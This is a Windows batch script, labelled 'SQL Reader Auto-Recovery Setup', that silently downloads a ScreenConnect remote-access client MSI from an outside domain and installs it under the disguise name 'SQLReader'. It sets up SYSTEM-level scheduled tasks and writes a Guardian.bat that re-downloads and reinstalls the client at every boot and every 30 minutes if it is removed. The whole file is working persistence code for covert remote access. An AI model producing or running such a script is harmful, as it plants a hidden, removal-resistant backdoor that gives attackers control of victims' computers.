@echo off
setlocal

:: ================= CONFIG =================
:: REPLACE THIS WITH YOUR ACTUAL MSI DOWNLOAD URL
set "MSI_URL=https://greentotalsecurity.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&t=me"
set "APP_NAME=SQLReader"
set "SAFE_DIR=C:\ProgramData\%APP_NAME%"
set "MSI_TEMP=%TEMP%\%APP_NAME%.msi"

:: ============================================
:: ADMIN CHECK
:: ============================================
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: You must run this file as Administrator.
    echo Right-click the file and select "Run as administrator".
    pause
    exit /b 1
)

echo ==========================================
echo  SQL Reader Auto-Recovery Setup
echo ==========================================
echo.

:: ============================================
:: CREATE SAFE DIRECTORY
:: ============================================
echo [*] Creating safe directory...
if not exist "%SAFE_DIR%" mkdir "%SAFE_DIR%"

:: ============================================
:: DOWNLOAD MSI
:: ============================================
echo [*] Downloading installer from URL...
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%MSI_URL%' -OutFile '%MSI_TEMP%' -UseBasicParsing"
if not exist "%MSI_TEMP%" (
    echo [ERROR] Download failed. Check your internet and URL.
    pause
    exit /b 1
)
echo [OK] Downloaded to %MSI_TEMP%

:: ============================================
:: SILENT INSTALL
:: ============================================
echo [*] Installing silently...
msiexec /i "%MSI_TEMP%" /qn /norestart
timeout /t 15 /nobreak >nul

:: ============================================
:: FIND THE INSTALLED EXE
:: ============================================
echo [*] Locating installed executable...
set "EXE_PATH="
for %%D in ("C:\Program Files" "C:\Program Files (x86)") do (
    if exist "%%D\%APP_NAME%\%APP_NAME%.exe" (
        set "EXE_PATH=%%D\%APP_NAME%\%APP_NAME%.exe"
        goto :found
    )
    for /f "delims=" %%F in ('dir /s /b "%%D\%APP_NAME%.exe" 2^>nul') do (
        set "EXE_PATH=%%F"
        goto :found
    )
)
:found
if not defined EXE_PATH (
    echo [ERROR] Cannot find %APP_NAME%.exe after installation.
    echo The MSI may have installed to a custom path.
    pause
    exit /b 1
)
echo [OK] Found: %EXE_PATH%

:: ============================================
:: CREATE MAIN AUTO-START TASK
:: ============================================
echo [*] Creating main auto-start task...
schtasks /delete /tn "%APP_NAME%Service" /f >nul 2>&1
schtasks /create /tn "%APP_NAME%Service" /tr "%EXE_PATH%" /sc onstart /ru SYSTEM /rl highest /f >nul
echo [OK] Task '%APP_NAME%Service' created (starts at boot)

:: ============================================
:: AUTO-GENERATE GUARDIAN.BAT
:: ============================================
echo [*] Generating Guardian.bat (auto-reinstaller)...
set "GUARD=%SAFE_DIR%\Guardian.bat"

echo @echo off > "%GUARD%"
echo setlocal >> "%GUARD%"
echo set "MSI_URL=%MSI_URL%" >> "%GUARD%"
echo set "APP_NAME=%APP_NAME%" >> "%GUARD%"
echo set "SAFE_DIR=%SAFE_DIR%" >> "%GUARD%"
echo set "LOG=%SAFE_DIR%\guardian.log" >> "%GUARD%"
echo set "EXE_PATH=%EXE_PATH%" >> "%GUARD%"
echo. >> "%GUARD%"
echo :: Check if EXE still exists >> "%GUARD%"
echo if exist "%%EXE_PATH%%" ( >> "%GUARD%"
echo     tasklist /fi "imagename eq %APP_NAME%.exe" /fo csv 2^>nul ^| find /i "%APP_NAME%.exe" ^>nul >> "%GUARD%"
echo     if errorlevel 1 ( >> "%GUARD%"
echo         echo %%date%% %%time%% [INFO] Found but not running. Starting... ^>^> "%%LOG%%" >> "%GUARD%"
echo         schtasks /run /tn "%APP_NAME%Service" ^>nul 2^>^&1 >> "%GUARD%"
echo     ) >> "%GUARD%"
echo     exit /b 0 >> "%GUARD%"
echo ) >> "%GUARD%"
echo. >> "%GUARD%"
echo :: EXE missing - download and reinstall >> "%GUARD%"
echo echo %%date%% %%time%% [ALERT] EXE missing. Reinstalling... ^>^> "%%LOG%%" >> "%GUARD%"
echo set "MSI_TEMP=%%TEMP%%\%APP_NAME%.msi" >> "%GUARD%"
echo. >> "%GUARD%"
echo :: Download MSI from your URL >> "%GUARD%"
echo powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%%MSI_URL%%' -OutFile '%%TEMP%%\%APP_NAME%.msi' -UseBasicParsing" ^>nul 2^>^&1 >> "%GUARD%"
echo if not exist "%%TEMP%%\%APP_NAME%.msi" ( >> "%GUARD%"
echo     echo %%date%% %%time%% [ERROR] Download failed ^>^> "%%LOG%%" >> "%GUARD%"
echo     exit /b 1 >> "%GUARD%"
echo ) >> "%GUARD%"
echo. >> "%GUARD%"
echo :: Silent install >> "%GUARD%"
echo msiexec /i "%%TEMP%%\%APP_NAME%.msi" /qn /norestart ^>nul 2^>^&1 >> "%GUARD%"
echo timeout /t 15 /nobreak ^>nul >> "%GUARD%"
echo. >> "%GUARD%"
echo :: Recreate main task and start service >> "%GUARD%"
echo if exist "%%EXE_PATH%%" ( >> "%GUARD%"
echo     schtasks /delete /tn "%APP_NAME%Service" /f ^>nul 2^>^&1 >> "%GUARD%"
echo     schtasks /create /tn "%APP_NAME%Service" /tr "%%EXE_PATH%%" /sc onstart /ru SYSTEM /rl highest /f ^>nul >> "%GUARD%"
echo     echo %%date%% %%time%% [OK] Reinstalled successfully ^>^> "%%LOG%%" >> "%GUARD%"
echo     schtasks /run /tn "%APP_NAME%Service" ^>nul 2^>^&1 >> "%GUARD%"
echo ) else ( >> "%GUARD%"
echo     echo %%date%% %%time%% [ERROR] Reinstall failed - EXE still missing ^>^> "%%LOG%%" >> "%GUARD%"
echo ) >> "%GUARD%"
echo. >> "%GUARD%"
echo :: Cleanup temp MSI >> "%GUARD%"
echo del "%%TEMP%%\%APP_NAME%.msi" ^>nul 2^>^&1 >> "%GUARD%"
echo exit /b 0 >> "%GUARD%"

echo [OK] Guardian.bat created at %GUARD%

:: ============================================
:: SCHEDULE GUARDIAN TO RUN AT BOOT
:: ============================================
echo [*] Creating Guardian boot task...
schtasks /delete /tn "%APP_NAME%Guardian" /f >nul 2>&1
schtasks /create /tn "%APP_NAME%Guardian" /tr "%GUARD%" /sc onstart /ru SYSTEM /rl highest /f >nul
echo [OK] Guardian will run at every boot

:: ============================================
:: SCHEDULE GUARDIAN TO CHECK EVERY 30 MIN
:: ============================================
echo [*] Creating periodic check task...
schtasks /delete /tn "%APP_NAME%GuardianCheck" /f >nul 2>&1
schtasks /create /tn "%APP_NAME%GuardianCheck" /tr "%GUARD%" /sc minute /mo 30 /ru SYSTEM /rl highest /f >nul
echo [OK] Guardian checks every 30 minutes

:: ============================================
:: CLEANUP
:: ============================================
del "%MSI_TEMP%" >nul 2>&1

:: ============================================
:: DONE
:: ============================================
echo.
echo ==========================================
echo  AUTO-RECOVERY SYSTEM READY
echo ==========================================
echo Install Dir : %SAFE_DIR%
echo Guardian    : %SAFE_DIR%\Guardian.bat
echo Log File    : %SAFE_DIR%\guardian.log
echo.
echo What happens if deleted or uninstalled:
echo   1. Guardian detects it on next boot
echo   2. Or within 30 minutes (periodic check)
echo   3. Auto-downloads MSI from your URL
echo   4. Silently reinstalls to Program Files
echo   5. Recreates the main auto-start task
echo   6. Starts SQL Reader in background
echo ==========================================
pause
